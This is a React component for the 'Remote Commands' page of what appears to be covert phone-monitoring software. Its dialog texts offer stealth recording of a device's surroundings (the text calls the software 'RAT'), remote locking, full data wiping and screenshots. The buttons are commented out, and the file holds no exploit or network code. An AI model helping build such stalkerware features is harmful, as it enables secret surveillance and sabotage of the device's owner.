import React, { useState } from "react";
import Box from "@mui/material/Box";
import "react-datepicker/dist/react-datepicker.css";
import { useParams } from "react-router-dom";
import { Typography, Grid, CardContent } from "@mui/material";
import MainCard from "ui-component/cards/MainCard";
import MicIcon from "@mui/icons-material/Mic";
import CameraIcon from "@mui/icons-material/Camera";
import LockIcon from "@mui/icons-material/Lock";
import AlertDialog from "helper/AlertModalRemote";
import { FaEraser } from "react-icons/fa6"
const RecordSurroundModal = {
  title: "Record Phone Surroundings",
  content:
    "Please enter the number of minutes you wish the software to record phone/tablet surroundings for and press Record. RAT will start recording the device surroundings in stealth mode.",
  agreeText: "Record",
  disagreeText: "Close",
};
//test
const LockPhoneModal = {
  title: "Lock Phone or Tablet",
  content:
    "Please first enter the password thatâ€™ll unlock the monitored device once its locked. After that, press on the â€˜Lock Phoneâ€™ button to lock the phone. Note that the locked device will only be unlocked using the password that you are going to set.",
  agreeText: "Lock Phone",
  disagreeText: "Close",
};

const PhoneWipeModal = {
  title: "Wipe Data from Phone or Tablet",
  content:
    "Warning! You cannot undo this action. Erased data cannot be retrieved again. If you press Wipe Device button, all data will be deleted from monitored device and there is no way to reverse the action.",
  agreeText: "Wipe Device",
  disagreeText: "Close",
};

const TakeScreenShotModal = {
  title: "Take Screenshot",
  content: "This feature is available only for Rooted Android devices.",
  agreeText: "Take Screenshot",
  disagreeText: "Close",
};

const RemoteControl = () => {
  const urlParam = useParams();
  const userDeviceIdAsNumber = urlParam.userDeviceId;
  // const params = `DeviceUserId=${userDeviceIdAsNumber}&Page=${currentPageNumber}&PageSize=${10}`;
  const [dialogOpen, setDialogOpen] = useState(false);
  const [isInputReq, setIsInputReq] = useState(false);
  const [dialogContent, setDialogContent] = useState({
    title: "",
    content: "",
    agreeText: "",
    disagreeText: "",
  });
  const handleOpenDialog = (content, inputReq) => {
    setDialogContent(content);
    setIsInputReq(inputReq)
    setDialogOpen(true);
  };

  const handleCloseDialog = () => {
    setDialogContent({
      title: "",
      content: "",
      agreeText: "",
      disagreeText: "",
    });
    setIsInputReq(false)
    setDialogOpen(false);
  };

  return (
    <>
      <MainCard content={false} title="Remote Commands">
        <CardContent>
          <Grid container spacing={2}>
            {/* <Grid item xs={12} md={6}>
              <Box
                sx={{ display: "flex", justifyContent: "center" }}
                onClick={() => handleOpenDialog(RecordSurroundModal, true)}
              >
                <MicIcon
                  sx={{
                    background: "#E3F2FD",
                    borderRadius: "99%",
                    fontSize: "140px",
                    padding: "30px",
                    cursor: "pointer",
                    color: "#616161",

                    "&:hover": {
                      backgroundColor: "rgb(232, 240, 254)",
                      color: "#1E88E5",
                    },
                  }}
                />
              </Box>
              <Typography
                sx={{
                  textAlign: "center",
                  marginTop: "20px",
                  fontWeight: "500",
                  fontSize: "1.2rem",
                  color: "#1E88E5",

                }}
                variant="h4"
              >
                Record Surround
              </Typography>
            </Grid>{" "} */}
            {/* <Grid item xs={12} md={4}>
              <Box
                sx={{ display: "flex", justifyContent: "center" }}
                onClick={() => handleOpenDialog(LockPhoneModal, true)}
              >
                <LockIcon
                  sx={{
                    background: "#E3F2FD",
                    borderRadius: "99%",
                    fontSize: "140px",
                    padding: "30px",
                    cursor: "pointer",
                    color: "#616161",

                    "&:hover": {
                      backgroundColor: "rgb(232, 240, 254)",
                      color: "#1E88E5",
                    },
                  }}
                />
              </Box>
              <Typography
                sx={{
                  color: "#616161",
                  textAlign: "center",
                  marginTop: "20px",
                  fontWeight: "500",
                  color: "#1E88E5",
                  fontSize: "1.2rem",
                }}
                variant="h4"
              >
                Power Off / Switch Off
              </Typography>
            </Grid>{" "} */}
            {/* <Grid item xs={12} md={6}>
              <Box
                sx={{ display: "flex", justifyContent: "center" }}
                onClick={() => handleOpenDialog(PhoneWipeModal, false)}
                className='wipe-phone-icon'
              >
                <FaEraser
                 className="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-wsrap8-MuiSvgIcon-root"
                  sx={{
                    background: "#E3F2FD",
                    borderRadius: "99%",
                    fontSize: "140px",
                    padding: "30px",
                    cursor: "pointer",
                    color: "#616161",

                    "&:hover": {
                      backgroundColor: "rgb(232, 240, 254)",
                      color: "#1E88E5",
                    },
                  }}
                />
              </Box>
              <Typography
                sx={{
                  color: "#616161",
                  textAlign: "center",
                  marginTop: "20px",
                  fontWeight: "500",
                  color: "#1E88E5",
                  fontSize: "1.2rem",
                }}
                variant="h4"
              >
                Wipe Phone
              </Typography>
            </Grid>{" "} */}
            {/* <Grid item xs={12} md={3}>
              <Box
                sx={{ display: "flex", justifyContent: "center" }}
                onClick={() => handleOpenDialog(TakeScreenShotModal, false)}
              >
                <CameraIcon
                  sx={{
                    background: "#E3F2FD",
                    borderRadius: "99%",
                    fontSize: "140px",
                    padding: "30px",
                    cursor: "pointer",
                    color: "#616161",

                    "&:hover": {
                      backgroundColor: "rgb(232, 240, 254)",
                      color: "#1E88E5",
                    },
                  }}
                />
              </Box>
              <Typography
                sx={{
                  color: "#616161",
                  textAlign: "center",
                  marginTop: "20px",
                  fontWeight: "500",
                  color: "#1E88E5",
                  fontSize: "1.2rem",
                }}
                variant="h4"
              >
                Take Screenshot
              </Typography>
            </Grid>{" "} */}
          </Grid>
        </CardContent>
      </MainCard>
      <AlertDialog
        open={dialogOpen}
        onClose={handleCloseDialog}
        title={dialogContent?.title}
        content={dialogContent?.content}
        agreeText={dialogContent?.agreeText}
        disagreeText={dialogContent?.disagreeText}
        isInputFieldReq={isInputReq}
        userDeviceIdAsNumber={userDeviceIdAsNumber}
      />
    </>
  );
};

export default RemoteControl;
